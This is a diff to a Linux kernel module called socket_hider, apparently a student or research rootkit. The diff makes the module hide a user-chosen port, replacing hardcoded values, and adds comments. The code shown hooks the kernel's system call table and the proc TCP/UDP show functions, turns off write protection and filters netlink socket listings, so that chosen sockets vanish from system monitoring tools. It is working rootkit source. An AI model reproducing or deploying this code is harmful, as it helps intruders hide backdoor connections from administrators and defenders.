@@ -18,9 +18,29 @@
 
 #include "sysmap.h"
 
+/* modinfo information */
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");
+MODULE_DESCRIPTION("Hides sockets.");
+
+/* module parameters */
+static char tlp_version[4];
+module_param_string(protocol, tlp_version, 4, 0);
+static int port_number;
+module_param(port_number, int, 0);
+
+/* call counter to prevent unhooking the syscall while it is still in use */
 static int call_counter = 0;
 
+/* pointer to the sys_call_table */
 void **sys_call_table;
+
+/* the original syscalls we are hooking */
+asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
+asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
+asmlinkage ssize_t (*original_recvmsg) (int sockfd, struct msghdr *msg, int flags);
+
+
 
 /* since this sturct is no longer available in proc_fs, taken from fs/proc/internal.h */
 struct proc_dir_entry {
@@ -45,10 +65,6 @@ struct proc_dir_entry {
   };
 
 
-asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
-asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
-asmlinkage ssize_t (*original_recvmsg) (int sockfd, struct msghdr *msg, int flags);
-
 /* Access the port number and if it should be hidden then return 0 else return the original function */
 static int manipulated_tcp_show(struct seq_file* m, void *v)
 {
@@ -62,9 +78,10 @@ static int manipulated_tcp_show(struct seq_file* m, void *v)
 	inet = inet_sk(sk);
 	port = ntohs(inet->inet_sport);
 	
-	/* Hard coded to the port we know: todo: Change it according to user input*/
 	if(port == 22)
+	{
 		return 0;
+	}
 
 	return original_tcp_show(m,v);
 }
@@ -84,9 +101,10 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
         inet = inet_sk(sk);
         port = ntohs(inet->inet_sport);
         
-        /* Hard coded to the port we know: todo: Change it according to user input @gmc*/
-        if(port == 111)
+        if(port == port_number)
+	{
                 return 0;
+	}
 
         return original_udp_show(m,v);
 }
@@ -98,8 +116,12 @@ static int checkport(struct nlmsghdr *nlh)
     	int lport = ntohs(r->id.idiag_sport);
 	
 		
-	if(lport == 22) //@gmc: change
-	{	printk("matched the version \n"); return 1;}
+	if(lport == port_number) 
+	{
+		printk("matched the version \n");
+		return 1;
+	}
+	
 	return 0;
 }
 
@@ -121,11 +143,14 @@ asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags
         h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
         numblocks = msg->msg_iovlen;
         r = NLMSG_DATA(h);
-        // compute the length of original call 
+       
+	// compute the length of original call 
         ret = original_recvmsg(sockfd,msg,flags);
-        // count holds the bytes remaining
+        
+	// count holds the bytes remaining
         count = ret;
-        // now, we remove the sockets to be hidden from the result...
+        
+	// now, we remove the sockets to be hidden from the result...
         found = 1;
 	
 	while (NLMSG_OK(h, count)) 
@@ -160,6 +185,10 @@ asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags
 	
 //return original_recvmsg(sockfd,msg,flags);
 }
+
+
+
+
 /*
  * Disable the writing protection for the whole processor.
  */
@@ -189,6 +218,8 @@ static void enable_page_protection (void)
 }
 
 
+
+/* the init function */
 static int __init hidemodule_init(void)
 {
 	printk(KERN_INFO "Loading socket_hider LKM...\n");
@@ -239,6 +270,9 @@ static int __init hidemodule_init(void)
 	return 0;
 }
 
+
+
+/* the unload function */
 static void __exit hidemodule_exit(void)
 {
 	printk(KERN_INFO "Unloading sockethider module... bye!\n");
